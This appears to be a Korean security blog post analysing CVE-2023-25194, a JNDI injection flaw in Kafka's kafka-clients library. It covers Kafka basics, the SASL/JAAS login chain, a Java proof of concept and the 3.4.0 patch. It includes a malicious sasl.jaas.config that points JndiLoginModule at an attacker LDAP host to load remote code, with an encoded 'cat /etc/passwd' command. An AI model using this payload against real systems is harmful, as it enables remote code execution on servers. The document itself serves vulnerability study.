---
title : "Kafka 1-day Analysis Part1"
date : 2026-04-19 10:00:00 +0900
categories: [Research]
tags: [Java, Kafka, 1day]
media_subpath: /assets/img/posts/kafka-analysis
---
<aside>
💡

**Reference**

https://infocondb.org/con/def-con/def-con-33/client-or-server-the-hidden-sword-of-damocles-in-kafka

https://nvd.nist.gov/vuln/detail/cve-2023-25194

https://github.com/azraelxuemo/Presentations/blob/main/DEFCON%2033/Client%20or%20Server.pdf

</aside>

# TL;DR

kafka 인프라에 대한 공격

→ 특정 사용자에 대한 공격이 아님

# What is Kafka?

한줄 요약

> 서비스들 사이에서 메시지를 주간에 보관하고 전달해주는 시스템
> 

## 왜 필요한가?

현대 서비스는 하나의 거대한 프로그램이 아니라 여러 개의 작은 서비스로 나뉜다.

예를 들어서 쿠팡에서 주문을 하면

```bash
주문 서비스
결제 서비스
배송 서비스
알림 서비스
포인트 서비스
...
```

이런식으로 서비스들이 서로 소통해야 한다. 하지만 직접 연결하면 몇가지 문제가 생긴다.

```bash
직접 연결시 문제 : 
주문 서비스 -> 결제 서비스 (결제 서비스 다운되면 주문도 실패)
주문 서비스 -> 배송 서비스 (배송 서비스가 느리면 주문도 느려짐)
주문 서비스 -> 알림 서비스 (알림 서비스 오류나면 주문도 오류남)
```

하지만 여가서 Kafka가 중간에 있다면

```bash
주문 서비스 -> Kafka -> 결제 서비스
										-> 배송 서비스
										-> 알림 서비스
										
결제 서비스 다운돼도 -> 메시지는 Kafka에 안전하게 보관
나중에 복구되면 -> 밀린 메시지 처리
```

## 핵심 용어 정리

### Producer(생산자)

```bash
메시지를 보내는 쪽
ex) 주문 서비스가 "주문 발생" 메시지를 Kafka에 전송함
```

### Consumer(소비자)

```bash
메시지를 받는 쪽
ex) 결제/배송/알림 서비스가 Kafka에서 메시지를 꺼내서 처리함
```

### Topic(토픽)

```bash
메시지를 분류하는 채널
ex)
"주문" 토픽 -> 주문 관련 메시지
"결제" 토픽 -> 결제 관련 메시지
"배송" 토픽 -> 배송 관련 메시지
```

### Broker(브로커)

```bash
메시지를 실제로 저장하고 관리하는 서버
모든 메시지가 Broker를 거쳐서 이동함
```

## Kafka Broker 구조

Broker는 kafka의 심장이라고 할 수 있다.

```bash
Producer
    ↓ 메시지 전송
  Broker
  ┌─────────────────────┐
  │  Topic: "주문"       │
  │  [msg1][msg2][msg3] │  ← 메시지가 순서대로 쌓임
  │                     │
  │  Topic: "결제"       │
  │  [msg1][msg2]       │
  └─────────────────────┘
    ↓ 메시지 전달
Consumer
```

### Broker의 역할

```bash
1. 메시지 수신 및 저장
2. Consumer에게 메시지 전달
3. 메시지 복제 (장애 대비)
4. 접근 인증 및 인가 처리 <- 발표에서 공격했던 attack surface
```

Broker의 특징

```bash
메시지를 읽어도 삭제 안 함
-> 설정한 기간 동안 보관
-> 나중에 다시 읽기 가능
-> 새로운 Consumer도 과거 메시지 읽기 가능
```

## Kafka 생태계 전체 구조

Kafka 자체만 있는 게 아니라 주변에 다양한 도구들이 있다.

```bash
외부 시스템
(DB, API...)
     ↓
Kafka Connect       ← 외부 시스템과 Kafka를 연결
     ↓
Kafka Broker        ← 핵심, 메시지 저장/전달
     ↓
ksqlDB             ← Kafka 데이터를 SQL로 처리
     ↓
Consumer 서비스들
```

### Kafka Connect란?

```bash
외부 시스템 <--> Kafka 연결 도구
ex)
MySQL DB가 변경되면 자동으로 Kafka에 전송함
Kafka 메시지를 자동적으로 Elasticsearch에 저장

직접 코드 안 짜도 설정만으로 연결 가능
```

### ksqlDB란?

```bash
Kafka 데이터를 SQL로 실시간 처리

일반 SQL : 
SELECT * FROM orders WHERE amount > 10000
-> 저장된 데이터에서 조회

ksqlDB :
SELECT * FROM orders WHERE amount > 10000
-> 실시간으로 흘러들어오는 데이터에서 조회
```

## 발표와 해당 지식과의 연결

<aside>
💡

Broker  → 인증 과정(JAAS)이 있음
→ 이게 공격 벡터가 됨

Kafka Connect → 외부에서 설정 가능
→ 악성 설정 주입 가능

ksqlDB → 쿼리 실행 시 설정 변경 가능
→ 악성 설정 주입 가능

</aside>

### 발표자료

![Kafka cluster and partitions](cluster-and-partitions.png)

위의 발표 자료를 보면 한 가지 다른 것이 있다. 위에서는 Kafka cluster, Partition에 대해서 이야기 하지 않았지만 해당 그림에는 클러슽터와 파티션이 나와 있다. → What is it?

## Cluster and partition

## 전체 흐름

```bash
Producer들 → Kafka Cluster → Consumer들
(메시지 생성)  (저장/관리)    (메시지 처리)
```

## 파티션이 뭘까?

파티션이란 Topic을 여러 조각으로 나눈 것이다.

```bash
"주문" Topic
├── Partition 0: [주문1][주문4][주문7]
├── Partition 1: [주문2][주문5][주문8]
└── Partition 2: [주문3][주문6][주문9]
```

위의 설명만 들으면 잘 이해가 되지 않는데, 자세하게 설명하자면 → 왜 나누는가?

```bash
Partition이 1개면
-> 모든 메시지를 순서대로 하나씩 처리함
-> consumer 1개만 붙을 수 있음
-> 느림

Partition이 3개면
-> Consumer 3개가 각각 담당
-> 3배 빠름
-> 병렬 처리 가능
```

더 쉽게 간단한 예시를 들어서 설명하자면 : 

마트에 계산대가 하나라면 ? → 100명이 하나의 계산대에서 줄을 섬 → 느림

마트에 계산대가 3개라면 → 100명이 3개의 계산대에 나눠서 줄을 섬 → 빠름

## 그럼 Broker는 어디에?

이 그림에서 Kafka Cluster = Broker들의 묶음이다.

```bash
Kafka Cluster
├── Broker 1 (서버 1) → Partition들 담당
├── Broker 2 (서버 2) → Partition들 담당
└── Broker 3 (서버 3) → Partition들 담당
```

즉 broker가 여러 대가 모여서 Cluster를 구성한다.

# CVE-2023-25194

![Kafka clients ecosystem](kafka-clients-ecosystem.png)

일단 이 사진부터 이해를 해보자. 해당 사진은 Kafka clients 라이브러리를 사용하는 것들이다.

## kafka-clients란 무엇일까?

kafka에 연결할 때 사용하는 java 라이브러리이다. 즉, kafka와 통신하면 이 라이브러리를 반드시 써야한다.

→ cve-2023-25194의 취약점이 이 라이브러리 안에 있다.

그래서 이 그림이 말하는 것은 

```bash
Kafka-Clients 라이브러리 사용 -> 취약점도 같이 포함됨
kafka connect -> kafka clients 사용 -> 취약점 포함
Druid -> kafka-clients 사용 -> 취약점 포함
```

## 그럼 Druid는 무엇일까?

```bash
Apache Druid = 실시간 데이터 분석 DB
실시간 분석에 특화된 DB
kafka에서 데이터를 받아서 분석한다. -> 그래서 kafka-clients 사용함

```

## 취약점 한줄 요약

> Kafka 연결 설정을 공격자가 조작할 수 있으면, 인증 과정에서 악성 코드가 실행된다.
> 

## SASL이란?

일단 해당 취약점을 분석하기 전에 SASLl이라는 거에 대해서 알아야 한다. Kafka에 연결 할 때 인증이 필요하다. 허가된 클라이언트만 Kafka에 접속이 가능하다.

→ 이를 인증하는 방식 중 하나가 SASL이다.

<aside>
💡

SASL = Simple Authentication and Security Layer

그냥 “Kafka 접속 인증 방식” 이라고 이해하면 편할 것 같음

</aside>

## JAAS란?

한 가지 더 알아야 하는 지식 중 하나가 JAAS이다. JAAS 는 SASL 인증을 JAVA 에서 구현하는 프레임워크이다.

```bash
설정 파일에 이렇게 씀:

sasl.jaas.config =
    [LoginModule 이름] required
    username="admin"
    password="1234";
```

여기서 LoginModule = 실제 인증을 담당하는 코드

이러한 모듈 종류에는 여러가지가 있다.

```bash
PlainLoginModule -> 일반 username/password 인증
JndiLoginModule -> JNDI 서비스 통해 인증 <- 문제의 모듈
LdapLoginModule -> LDAP 서버 통해 인증
```

## JNDI란?

JNDI = Java Naming and Directory Interface → 쉽게 말하면 자바의 주소록이라고 할 수 있다.

```bash
"user123 객체가 어디있지?"
-> jndi 서버에 질의
-> "ldap://server.com/user123에 있다"
-> 거기서 가져와서 실행
```

여기서 문제가 발생한다.

```bash
JNDI 서버에서 가져온 데이터를 그대로 실행해버리는 로직이 존재한다.

JNDI 서버가 악성 Java 코드를 반환하면?
-> 그냥 실행
-> 공격자 코드가 피해자 서버에서 실행
-> RCE 달성
```

## Attack Flow

공격자가 Kafka 연결 설정을 조작할 수 있는 상황이라면

1. 공격자가 악성 sasl.jaas.config 주입

```bash
sasl.jaas.config =
       com.sun.security.auth.module.JndiLoginModule required
       user.provider.url="ldap://attacker.com/exploit";
```

1. kafka client 초기화 시작
2. 코드 실행 흐름 :

KafkaConsumer 생성

→ 채널 빌더 생성

→ SASL 채널 설정

→ LoginContext.login() 호출

→ JndiLoginModule.login() 호출

→ InitialContext.lookup(”ldap://attacker.com/exploit”)

1. 공격자 서버에 악성 java 객체 반환
2. 피해자 서버에서 악성 코드 실행

→ RCE

![발표자료의 attack flow](jndi-attack-flow.png)

발표자료의 attack flow

1. set up

공격자가 Evil JNDI Server를 미리 준비(악성 코드를 반환할 서버 세팅)

1. connection string

공격자가 Kafka Client에 악성 sasl.jaas.config 주입(ldap://evil-jndi-server/exploit)

1. lookup

kafka client가 JndiLoginModule 실행 → Evil JNDI Server에 lookup 요청

“이 주소에 있는 객체 줘” → 이렇게 질의

1. payload

evil jndi server가 악성 자바 코드(payload)를 반환함

1. taken over

kafka client가 악성 코드를 실행 → 공격자가 kafka client 서버 장악 → RCE

### Normal reqeust

kafka client에 접근하기 위해서는 

```java
properties.put("sasl.jaas.config", 
    "org.apache.kafka.common.security.plain.PlainLoginModule required\n" +
    "username=\"admin\"\n" +
    "password=\"1234\";");
```

이런식으로 개발자가 접근할 수 있다. 정상적인 흐름은 아래와 같다.

```java
개발자가 설정
sasl.jaas.config = PlainLoginModule + admin/1234
-> KafaConsumer 생성 -> PlainLoginModule 실행 -> 정상 인증 완료
```

### Evil Request

Kafka client에 접근할 때 아래와 같은 요청을 보낸다.

```java
properties.put("com.sun.security.auth.module.JndiLoginModule required\n" +
    "user.provider.url=" +
    "\"ldap://localhost/hhylKPnySW/Plain/Exec/eyJjbWQ...\"\n");
```

이렇게 악의적인 sasl.jaas.config를 주입하면

```java
공격 흐름:

공격자가 설정 주입
sasl.jaas.config = JndiLoginModule + ldap://attacker.com
        ↓
KafkaConsumer 생성
        ↓
JndiLoginModule 실행
        ↓
공격자 서버에 lookup
        ↓
악성 코드 실행 → RCE
```

위와 같은 체인으로 RCE가 가능하다

### PoC

```java
// 1~2번: Kafka 연결 설정 객체 생성
Properties properties = new Properties();

// 3번: 연결할 Kafka Broker 주소
properties.put("bootstrap.servers", "127.0.0.1:1234");

// 4~6번: 메시지 역직렬화 방식
properties.put("key.deserializer", deserializer);
properties.put("value.deserializer", deserializer);

// 7번: 인증 방식 = PLAIN
properties.put("sasl.mechanism", "PLAIN");

// 8번: 보안 프로토콜 = SSL 사용
properties.put("security.protocol", "SASL_SSL");

// 9~13번: ← attacker-controlled -> evil jaas inject
// JndiLoginModule 사용 + 악성 LDAP 주소 지정
String jaasConfig = 
    "com.sun.security.auth.module.JndiLoginModule required\n" +
    "user.provider.url=" +
    "\"ldap://localhost/hhylKPnySW/Plain/Exec/eyJjbWQ...\"\n"

// 14번: 악성 설정을 properties에 넣음
properties.put("sasl.jaas.config", jaasConfig);

// 15번: ← 여기서 터짐!
// KafkaConsumer 생성하는 순간 JAAS 설정 읽고 RCE 발생
KafkaConsumer kafkaConsumer = new KafkaConsumer<>(properties);
```

→ kafka client에 주입할 공격 코드

attacker-controlled 부분을 제외하고 다른 부분은 그냥 고정 값이다. 단순히 kafka 연결에 필요한 표준 코드이기 때문에 별로 중요하지 않다. 핵심은 아래의 코드이다.

```java
String jaasConfig = 
    "com.sun.security.auth.module.JndiLoginModule required\n" +
    "user.provider.url=" +
    "\"ldap://localhost/hhylKPnySW/Plain/Exec/eyJjbWQ...\"\n"

<base64 decode>
{"cmd":"cat /etc/passwd"}
```

이 코드가 제일 중요한 connection string이다. 

```java
15번 줄: KafkaConsumer 생성
    ↓
KafkaConsumer.<init>         ← 생성자 호출
    ↓
ClientUtils.createChannelBuilder    ← 채널 생성
    ↓
ChannelBuilders.clientChannelBuilder ← 채널 설정
    ↓
SaslChannelBuilder.configure         ← SASL 인증 설정
    ↓
...
    ↓
LoginContext.login                   ← 로그인 시작
    ↓
JNDILoginModule.login                ← 여기서 JNDI lookup 발생!
```

코드는 위와 같은 흐름으로 실행된다.

개발자가 의도한 것은 kafka consumer를 만드는 것이지만 내부적으로 위의 체인이 실행되면서 JndiLoginModule이 호출된다. → RCE 트리거

### 그렇다면 LoginContext.login 내부에서는 어떻게 동작할까?

![LoginContext login flow](logincontext-flow.png)

JVM 안에서 LoginContext가 JndiLoginModule을 어떻게 호출하는지 봐야한다.

<aside>
💡

LoginContext = Java 표준 라이브러리 (JDK 내장)

→ LoginContext는 Kafka의 함수가 아니라 JVM에 있는 프레임워크이다.

JDK (Java 기본 내장)
├── LoginContext       ← 여기 있음
├── JndiLoginModule   ← 여기도 있음
├── LdapLoginModule   ← 여기도 있음
└── ...

Kafka (별도 라이브러리)
├── KafkaConsumer
├── SaslChannelBuilder
└── ...
↓
내부적으로 JDK의 LoginContext 호출

</aside>

### Flow

1. connection string

공격자가 악성 sasl.jaas.config 주입

1. set config & login

Kafka client가 설정을 읽고 LoginContext에 로그인 요청

1. instantiate Subject

LoginContext가 Subject(인증 주체) 객체 생성

1. construct

LoginContext가 JndiLoginModule 생성

1. initialize with Subject, CallbackHandler, options

JndiLoginModule 초기화(악성 LDAP 주소가 options에 포함됨)

1. Login

JndiLoginModule.login() 호출

> 여기서 핵심 포인트는 LoginContext는 위에서 말했던 것처럼 Java 표준 인증 프레임워크이다. 원래는 정상적인 인증을 위한 것이지만, 악성 LoginModule(JndiLoginModule)을 주입하면 LoginContextx가 그걸 그대로 실행해버린다.
> 

### JndiLoginModule.login 내부 동작

```java
private void attemptAuthentication(boolean getPasswdFromSharedState) 
    throws LoginException {

    String encryptedPassword = null;

    // username과 password 먼저 가져옴
    getUsernamePassword(getPasswdFromSharedState);

    try {
        // ← 핵심 부분!
        // user.provider.url 값으로 JNDI lookup 실행
        InitialContext iCtx = new InitialContext();
        ctx = (DirContext)iCtx.lookup(userProvider);
        //                              ↑
        //                    여기에 악성 LDAP 주소가 들어감
        //    "ldap://localhost/hhylKPnySW/Plain/Exec/eyJjbWQ..."
```

위의 코드를 보면 `userProvider`에 악성 LDAP 주소가 삽입된다. 실제로 해당 줄이 실행 되는 순간 

→ 공격자 LDAP 서버에 접속 → 악성 코드 다운로드 → RCE 발생

> 핵심 포인트는 JndiLoginModule은 원래 LDAP 서버에서 사용자 정보를 가져오는 용도이지만 그 LDAP 주소를 공격자 서버로 바꾸면 악의적인 행위가 가능하다.
> 

### InitialContext.lookup의 위험성

lookup() 함수가 왜 RCE 체인으로 이어지는가?

```java
"A common sink"
= Risky method

Runtime.exec         → 명령어 직접 실행
ObjectInputStream.readObject → 역직렬화

"Lookup with an untrusted address leads to RCE"
= 신뢰할 수 없는 주소로 lookup하면 RCE 발생
```

![InitialContext lookup flow](initialcontext-lookup-flow.png)

Evil server set up → JNDI url injection

→ InitialContext.lookup

- your app code(피해자 서버)가 Evil JNDI server에 lookup 요청

→ payload

- Evil JNDI Server가 악성 java 객체 반환

→ taken over

- 피해자 서버가 악성 객체 실행 → RCE → 서버 장악

> lookup() 자체가 문제가 아니라 신뢰할 수 없는 주소로 lookup을 하는 것이 문제이다. 공격자가 주소를 바꿀 수 있으면 공격자 서버에서 뭐든 실행이 가능하다.
> 

# Patch code of cve-2024-25194

kafka 3.4.0에서는 아래와 같이 코드를 패치했다.

```java
// 1번: 차단할 LoginModule 기본값 설정
// JndiLoginModule을 기본으로 차단
public static final String DISALLOWED_LOGIN_MODULES_DEFAULT = 
    "com.sun.security.auth.module.JndiLoginModule";

// 3~13번: LoginModule 차단 로직
private static void throwIfLoginModuleIsNotAllowed(...) {
    
    // 4~7번: 차단 목록 가져오기
    // 시스템 설정에서 차단 목록 읽어옴
    // 기본값 = JndiLoginModule
    Set<String> disallowedList = Arrays.stream(
        System.getProperty(DISALLOWED_LOGIN_MODULES_CONFIG, 
                          DISALLOWED_LOGIN_MODULES_DEFAULT)
        .split(","))
        .map(String::trim)
        .collect(Collectors.toSet());

    // 8번: 사용하려는 LoginModule 이름 가져옴
    String loginModuleName = 
        appConfigurationEntry.getLoginModuleName().trim();

    // 9~11번: ← 핵심 패치 로직
    // 차단 목록에 있으면 Exception 발생시켜서 실행 막음
    if (disallowedList.contains(loginModuleName)) {
        throw new IllegalArgumentException(
            loginModuleName + " is not allowed.");
    }
}
```

위의 패치 코드의 문제점은 단순 이름 비교로 막고 있다는 것이다.

→ JndiLoginModule만 막힘

→ 다른 LoginModule은 우회 가능
